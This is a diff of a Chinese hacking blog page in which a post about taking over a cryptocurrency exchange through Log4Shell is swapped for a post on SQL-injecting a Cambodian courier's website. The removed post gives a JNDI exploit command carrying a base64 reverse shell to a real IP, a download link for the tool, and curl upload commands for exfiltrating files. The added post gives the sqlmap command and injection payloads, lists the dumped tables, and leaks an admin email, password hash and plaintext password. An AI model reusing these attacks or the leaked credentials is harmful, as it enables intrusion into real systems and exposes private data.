@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>LOG4拿下交易所 | APT-C-61</title>
+  <title>对柬埔寨申通的实战渗透 | APT-C-61</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -551,14 +551,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/photo_2022-03-04%2015.42.57.jpeg')">
+  background-position: center center;position: relative;background-image:url('/medias/9.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        LOG4拿下交易所
+        对柬埔寨申通的实战渗透
       </span>
     </div>
     
@@ -573,8 +573,8 @@
         <span class="post-detail-header_categories">
           <i class="iconfont iconbookmark1"></i> category：
           
-            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-detail-header_category">
-              渗透
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-detail-header_category">
+              渗透测试
             </a>
           
         </span>
@@ -598,72 +598,29 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <p><strong>注：图片需要用到全局代理进行显示</strong></p>
-<p><strong>因为在渗透过程中需要用到以下的东西，所以我把他提到了开头。</strong></p>
-<p><strong># 第一种的提交方式：如果Linux能访问网站可以通过Curl直接上传，从而打包文件，避免暴露的风险。</strong></p>
-<blockquote>
-<p>$ curl –upload-file .&#x2F;hello.txt <a target="_blank" rel="noopener" href="https://transfer.sh/hello.txt">https://transfer.sh/hello.txt</a> </p>
-<p>注：本方式只支持2GB文件的打包传输</p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://transfer.sh/YD2SwK/hello.txt">https://transfer.sh/YD2SwK/hello.txt</a></p>
-</blockquote>
-<blockquote>
-<p>$ transfer hello.txt</p>
-</blockquote>
-<p><strong>##################################################### 100.0%</strong> </p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://transfer.sh/Qpkxka/hello.txt">https://transfer.sh/Qpkxka/hello.txt</a></p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202201231813911.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202201231813911.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="屏幕截图 2021-12-30 002923.png"></p>
-<p><strong>第二种方式打包不超过100MB</strong></p>
-<blockquote>
-<p>curl –upload-file 上传文件名 <a target="_blank" rel="noopener" href="https://transfer.sh/%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%90%8D">https://transfer.sh/上传文件名</a>   2GB以内</p>
-<p>curl -F “file&#x3D;@上传文件名”  <a target="_blank" rel="noopener" href="https://file.io/">https://file.io</a>    100MB以内</p>
-</blockquote>
-<p><strong>前段时间LOG4不是很火么，然后我找了一些交易所，并且一个个测试，通过手工测试在位于一个交易所找回密码选项哪里出现了DNSLOG的回显，之后直接通过LOG4拿下</strong></p>
-<p><img src="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091639548.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091639548.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220209163932450"></p>
-<blockquote>
-<p><strong>鹰图语法：</strong>web.body&#x3D;”&#x2F;api&#x2F;market&#x2F;kline&#x2F;trad-view</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091640675.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091640675.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220209164027505"></p>
-<p><strong>攻击代码：</strong></p>
-<blockquote>
-<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82Ni4xNTIuMTcxLjQ2Lzg4ODkgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}” -A 66.152.171.46</p>
-</blockquote>
-<p><strong>攻击工具：</strong></p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://anonfiles.com/72h4Tfd6x9/JNDI-Injection-Exploit-1.0-SNAPSHOT-all_jar">https://anonfiles.com/72h4Tfd6x9/JNDI-Injection-Exploit-1.0-SNAPSHOT-all_jar</a></p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202201231812081.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202201231812081.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="屏幕截图 2021-12-29 204750.png"> </p>
-<p>因为具体服务器有更改所以上面放的是旧的图片</p>
-<p><img src="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091642723.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091642723.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220209164254674"></p>
-<p><strong>漏洞地点目录：</strong>&#x2F;common&#x2F;forgotpassword</p>
-<p>通过screen工具在同服务器上创建两个窗口</p>
-<p><img src="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091644410.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091644410.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220209164402383"></p>
-<p>一个窗口是JN也就是漏洞利用监听，一个窗口是反弹的shell的监听端口</p>
-<p><img src="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091646367.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091646367.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220209164604315"></p>
-<p>执行LOG4命令，接下去上nc去看看</p>
-<p><img src="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091646022.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091646022.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220209164651000"></p>
-<p>成功反弹shell里，权限是Root权限</p>
-<p><img src="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091648874.png" class="lazyload placeholder" data-srcset="https://raw.githubusercontent.com/ANQUSEC/imget/master//blogImg/202202091648874.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="image-20220209164801855"></p>
-<p>不深入-学习的东西还有很多</p>
+        <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://www.stocambodia.com/search.php?act=detail&amp;bglxid=972%E9%8E%88%27%22%5C%28&amp;cc=4111111111111111%2C&amp;city=&amp;country=NSW%E6%96%B0%E5%8D%97%E5%A8%81%E5%B0%94%E5%A3%AB%E5%B7%9E&amp;czcc=1&amp;gg=1%2C&amp;js=1%2C&amp;kk=1%2C&amp;weight=1%2C&amp;youbian=&quot; <span class="operator">-</span>p bglxid <span class="operator">-</span>D shentong <span class="comment">--tables --batch</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2021.55.20.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2021.55.20.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="截屏2022-03-31 21.55.20"></p>
+<h2 id="渗透测试第一部：数据暴库"><a href="#渗透测试第一部：数据暴库" class="headerlink" title="渗透测试第一部：数据暴库"></a>渗透测试第一部：数据暴库</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: <span class="title function_ invoke__">bglxid</span> (GET)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL OR error-based - WHERE <span class="keyword">or</span> HAVING <span class="title function_ invoke__">clause</span> (FLOOR)</span><br><span class="line">    Payload: act=detail&amp;bglxid=-<span class="number">7745</span> OR <span class="number">1</span> GROUP BY <span class="title function_ invoke__">CONCAT</span>(<span class="number">0x716a707671</span>,(<span class="title function_ invoke__">SELECT</span> (CASE <span class="title function_ invoke__">WHEN</span> (<span class="number">4657</span>=<span class="number">4657</span>) THEN <span class="number">1</span> ELSE <span class="number">0</span> END)),<span class="number">0x71626a7671</span>,<span class="title function_ invoke__">FLOOR</span>(<span class="title function_ invoke__">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>)) HAVING <span class="title function_ invoke__">MIN</span>(<span class="number">0</span>)<span class="comment">#&amp;cc=4111111111111111,&amp;city=&amp;country=NSW%E6%96%B0%E5%8D%97%E5%A8%81%E5%B0%94%E5%A3%AB%E5%B7%9E&amp;czcc=1&amp;gg=1,&amp;js=1,&amp;kk=1,&amp;weight=1,&amp;youbian=</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.0</span>.<span class="number">12</span> time-based blind - Parameter <span class="title function_ invoke__">replace</span> (substraction)</span><br><span class="line">    Payload: act=detail&amp;bglxid=(SELECT <span class="number">7733</span> <span class="title function_ invoke__">FROM</span> (<span class="title function_ invoke__">SELECT</span>(<span class="title function_ invoke__">SLEEP</span>(<span class="number">5</span>)))tfTu)&amp;cc=<span class="number">4111111111111111</span>,&amp;city=&amp;country=NSW%E6%<span class="number">96</span>%B0%E5%<span class="number">8</span>D%<span class="number">97</span>%E5%A8%<span class="number">81</span>%E5%B0%<span class="number">94</span>%E5%A3%AB%E5%B7%<span class="number">9</span>E&amp;czcc=<span class="number">1</span>&amp;gg=<span class="number">1</span>,&amp;js=<span class="number">1</span>,&amp;kk=<span class="number">1</span>,&amp;weight=<span class="number">1</span>,&amp;youbian=</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h3 id="记录数据多的数据库："><a href="#记录数据多的数据库：" class="headerlink" title="记录数据多的数据库："></a>记录数据多的数据库：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Database: shentong</span><br><span class="line">+------------------------+---------+</span><br><span class="line">| Table                  | Entries |</span><br><span class="line">+------------------------+---------+</span><br><span class="line">| ecs_stats              | 354977  |</span><br><span class="line">| ecs_admin_log          | 273014  |</span><br><span class="line">| ecs_zzfw_list          | 186535  |</span><br><span class="line">| ecs_route              | 87329   |</span><br><span class="line">| ecs_pianyuan_xq        | 85356   |</span><br><span class="line">| ecs_order_income       | 37977   |</span><br><span class="line">| ecs_order_outcome      | 31605   |</span><br><span class="line">| ecs_bank_info          | 28552   |</span><br><span class="line">| ecs_sessions_data      | 17238   |</span><br><span class="line">| ecs_jifen_log_copy1    | 15496   |</span><br><span class="line">| ecs_keywords           | 8361    |</span><br><span class="line">| ecs_jifen_user_copy1   | 5374    |</span><br><span class="line">| ecs_jifen_user_copy    | 4882    |</span><br><span class="line">| ecs_wx_message         | 3814    |</span><br><span class="line">| ecs_cz_info            | 3612    |</span><br><span class="line">| ecs_region             | 3408    |</span><br><span class="line">| ecs_qywx_djr           | 3051    |</span><br><span class="line">| ecs_bank_zxcb          | 2798    |</span><br><span class="line">| ecs_users              | 2440    |</span><br><span class="line">| ecs_paisong_czsm       | 1713    |</span><br><span class="line">| ecs_pay_log            | 1561    |</span><br><span class="line">| ecs_area_copy          | 1397    |</span><br><span class="line">| ecs_area               | 1326    |</span><br><span class="line">| ecs_jiali              | 861     |</span><br><span class="line">| ecs_searchengine       | 832     |</span><br><span class="line">| ecs_huojia             | 750     |</span><br><span class="line">| ecs_user_address       | 553     |</span><br><span class="line">| ecs_reg_extend_info    | 442     |</span><br><span class="line">| ecs_post_num_jl        | 394     |</span><br><span class="line">| ecs_order_action       | 336     |</span><br><span class="line">| ecs_vip_bglx           | 335     |</span><br><span class="line">| ecs_types              | 301     |</span><br><span class="line">| ecs_admin_action       | 286     |</span><br><span class="line">| ecs_order_zhichu       | 252     |</span><br><span class="line">| ecs_shop_config        | 239     |</span><br><span class="line">| ecs_goods_gallery      | 217     |</span><br><span class="line">| ecs_account_log        | 213     |</span><br><span class="line">| ecs_shop_config_wap    | 191     |</span><br><span class="line">| ecs_ad                 | 157     |</span><br><span class="line">| ecs_price_gbj          | 135     |</span><br><span class="line">| ecs_fencheng_jilu_copy | 124     |</span><br><span class="line">| ecs_fq_copy            | 115     |</span><br><span class="line">| ecs_fq                 | 100     </span><br></pre></td></tr></table></figure>
+
+<h2 id="后台攻破："><a href="#后台攻破：" class="headerlink" title="后台攻破："></a>后台攻破：</h2><p><em>后台数据表：ecs_admin_user</em> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin1,&lt;blank&gt;,&lt;blank&gt;,<span class="number">1259</span>,<span class="number">525999955</span>@qq.com,<span class="number">0</span>,<span class="number">0</span>,&lt;blank&gt;,<span class="number">2331</span>,<span class="number">96.9</span><span class="number">.88</span><span class="number">.251</span>,<span class="number">1634947229</span>,&lt;blank&gt;,331b05b18d04030e9b900c00553d497a,NULL,&lt;blank&gt;,&lt;blank&gt;,<span class="number">0</span>,admin1,<span class="number">1635709960</span>,<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">admin1  sto123</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2021.58.56.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2021.58.56.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="截屏2022-03-31 21.58.56"></p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/LOG4/" class="">
-              LOG4
+            <a href="/tags/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/" class="">
+              实战渗透
             </a>
           
-            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/" class="">
-              漏洞实战
-            </a>
-          
-            <a href="/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" class="">
-              渗透实战
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="">
+              SQL注入
             </a>
           
         </div>
@@ -677,7 +634,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>link:  </strong>
-    <a href="/2021/10/30/LOG4拿下交易所/" target="_blank" title="LOG4拿下交易所">http://example.com/2021/10/30/LOG4拿下交易所/</a>
+    <a href="/2021/10/30/对柬埔寨申通的实战渗透/" target="_blank" title="对柬埔寨申通的实战渗透">http://example.com/2021/10/30/对柬埔寨申通的实战渗透/</a>
     </li>
     <li class="post-copyright-license">
       <strong>Copyright notice:   </strong>
@@ -699,16 +656,18 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/09.jpg" class="lazyload placeholder" data-srcset="/medias/09.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+      <img class="lazyload lazyload placeholder" src="/medias/photo_2022-03-04%2015.42.57.jpeg" class="lazyload placeholder" data-srcset="/medias/photo_2022-03-04%2015.42.57.jpeg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
     </div>
-    <a href="/2022/03/31/%E5%82%A8%E5%AD%98%E4%BA%91/" class="post-nav-link">
+    <a href="/2021/10/30/LOG4%E6%8B%BF%E4%B8%8B%E4%BA%A4%E6%98%93%E6%89%80/" class="post-nav-link">
       <div class="title">
         <i class="fas fa-angle-left"></i> Prev:
-        <div class="title-text">云存储清单</div>
+        <div class="title-text">LOG4拿下交易所</div>
       </div>
       
       <!-- <div class="content">
-        **100GB+免费云存储清单在云**盘.360.cn注册即可获得360GB免费存储。（可通过下载 PC 和 Andro
+        注：图片需要用到全局代理进行显示
+因为在渗透过程中需要用到以下的东西，所以我把他提到了开头。
+# 第一种的提交方式：如果
       </div> -->
     </a>
   </div>
@@ -719,15 +678,15 @@
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/9.jpg" class="lazyload placeholder" data-srcset="/medias/9.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="/medias/06.jpg" class="lazyload placeholder" data-srcset="/medias/06.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
     </div>
-    <a href="/2021/10/30/%E5%AF%B9%E6%9F%AC%E5%9F%94%E5%AF%A8%E7%94%B3%E9%80%9A%E7%9A%84%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/" class="post-nav-link">
+    <a href="/2021/10/30/%E7%A9%BF%E8%B6%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/" class="post-nav-link">
       <div class="title">
         Next: <i class="fas fa-angle-right"></i>
-        <div class="title-text">对柬埔寨申通的实战渗透</div>
+        <div class="title-text">穿越边界的姿势</div>
       </div>
       <!-- <div class="content">
-        1sqlmap -u &quot;http://www.stocambodia.com/search.php?act=d
+        在企业安全对抗中，红方攻击团队经常会遇到这种情况，在企业的网络边界上获取到部分权限，比如一个web服务器的webshel
       </div> -->
     </a>
   </div>
